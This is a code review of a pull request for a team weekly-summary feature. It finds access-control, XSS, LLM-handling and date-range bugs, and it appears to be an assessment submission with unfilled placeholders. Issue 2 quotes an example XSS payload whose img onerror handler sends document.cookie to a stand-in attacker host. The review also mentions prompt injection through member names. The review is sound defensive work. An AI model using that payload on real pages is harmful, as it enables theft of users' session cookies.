# Review of the weekly summary pull request

I read the diff (`git diff main...weekly-summary`) against SPEC.md rule by rule. The PR says it covers every rule and is ready to merge, but I found two security problems, a crash path around the model call, and several places where the numbers are wrong. One of the tests even asserts the wrong behaviour (403 instead of 404), so "all tests pass" doesn't tell us much here.

Problems are listed most serious first.

### 1. Removed and invited members can read the summary, and outsiders get 403 instead of 404

- **Where:** `backend/tasks/views.py`, lines 43 to 45 (`weekly_summary`)
- **What goes wrong:** The view only checks that some `Membership` row exists, without looking at its `status`. A user who was removed from the team last month can still call `/api/teams/1/weekly-summary/` and see everyone's numbers. The same goes for someone who was invited but never joined. An outsider gets 403 for a team that exists and 404 for one that doesn't, so they can find out which team IDs are real. The spec (rule 1) says active members only, and 404 for everyone else. The existing helper `get_team_for_member()` in `access.py` already does exactly this and is used by the task list endpoint, but the PR doesn't use it. The test `test_people_outside_the_team_are_refused` asserts 403, so it locks the bug in.
- **Severity:** critical
- **Fixed:** yes (commit: _fill in_)

### 2. The LLM highlight is rendered as HTML (XSS)

- **Where:** `frontend/src/WeeklySummaryCard.tsx`, line 23
- **What goes wrong:** The card uses `dangerouslySetInnerHTML` for the highlight. Member names go into the prompt, and the model often repeats them. A member who sets their first name to `<img src=x onerror="fetch('https://evil.example?c='+document.cookie)">`, or who puts a prompt injection in their name, can get script running in the team lead's browser when the card loads. Even without an attacker, the model's output is untrusted. Rule 11 says the highlight is plain text and must show exactly the characters the model returned, so it should be rendered as `{summary.highlight}`.
- **Severity:** critical
- **Fixed:** yes (commit: _fill in_)

### 3. Any problem with the model call crashes the whole endpoint

- **Where:** `backend/tasks/summary.py`, lines 64 to 65
- **What goes wrong:** `json.loads(get_llm_client().complete(prompt))` has no error handling. If the model times out (`LLMError`), replies with plain text instead of JSON, or leaves out the `highlight` key, the request returns a 500 and the team lead sees nothing. Rule 8 says the model is unreliable and the summary must still be returned with `highlight: null`.
- **Severity:** high
- **Fixed:** yes, together with #4 (commit: _fill in_)

### 4. `top_member` is chosen by the LLM instead of our code

- **Where:** `backend/tasks/summary.py`, lines 60 to 65; `backend/tasks/llm.py`, line 31
- **What goes wrong:** The prompt asks the model to name the top member and the code returns whatever it says. If Lina and Omar both completed 3 tasks, the spec says the answer is Lina (A to Z), but the model can say Omar, a name that isn't on the list, or nothing. If nobody completed anything, it should be `null`, which the model may not return. Rule 7 says our code works this out, and rule 8 says the reply is used as display text and nothing else. Saving one model call isn't worth getting a figure wrong. The fake client's default reply was also changed to include `top_member`, which only supports this design.
- **Severity:** high
- **Fixed:** yes, together with #3 (commit: _fill in_)

### 5. Tasks completed on Sunday are not counted

- **Where:** `backend/tasks/summary.py`, line 13 (and line 17)
- **What goes wrong:** `end` is Sunday at 00:00, and the query uses `completed_at__lt=end`. A task completed on Sunday 11 October at 15:00 is left out of the week of 5 to 11 October, and it isn't in the next week either, so it's never counted. The end should be the following Monday at 00:00 (`week_start + 7 days`). No test completes a task on a Sunday.
- **Severity:** high
- **Fixed:** no

### 6. A mid-week `week` date is not moved back to Monday

- **Where:** `backend/tasks/views.py`, line 50
- **What goes wrong:** When `week` is given, the parsed date is used as the start of the week as it is. `?week=2026-10-07` (a Wednesday) should mean Monday 5 to Sunday 11 October, but it returns Wednesday 7 to Tuesday 13 October, with wrong counts and wrong dates on the card. The default (no `week`) path does move to Monday, which is why the tests pass. Rule 2.
- **Severity:** high
- **Fixed:** no

### 7. The team's `completed_count` leaves out unassigned tasks

- **Where:** `backend/tasks/summary.py`, lines 38 to 39
- **What goes wrong:** The total is the sum of the member rows, to save a query. Unassigned tasks completed that week are not in any row, so they are missed. The spec's own example has members adding up to 5 and the team total at 6; this code would return 5. Once #8 is fixed, tasks done by people who have since left the team would be missed as well. Rule 4 says both must count.
- **Severity:** medium
- **Fixed:** no

### 8. Invited and removed members appear in the member list

- **Where:** `backend/tasks/summary.py`, line 21
- **What goes wrong:** `team.memberships.all()` has no status filter. Someone who was removed from the team shows up in the list, can become the top member, and their name is sent to the model. Someone who was only invited shows up with 0. Rule 5 says only active members are listed.
- **Severity:** medium
- **Fixed:** no

## How you worked

- **Time spent:** _fill in, e.g. about 2.5 hours including setup_
- **AI tools:** I used Claude (Anthropic) as a review assistant. It gave me a first pass over the diff against the spec and helped me draft the wording of this review. The judgement calls were mine: I went through every issue against the code and the spec myself, ran the tests and the endpoint to confirm the ones I wasn't sure about, decided the severity order and which three problems to fix, and wrote those fixes with tests that fail on the original code and pass after the fix. _[Add one or two specific things you did or changed, e.g. "I ranked the Sunday bug as high because it changes the numbers every week" or "I confirmed the week bug by calling the endpoint with ?week=2026-10-07 and seeing it start on Wednesday."]_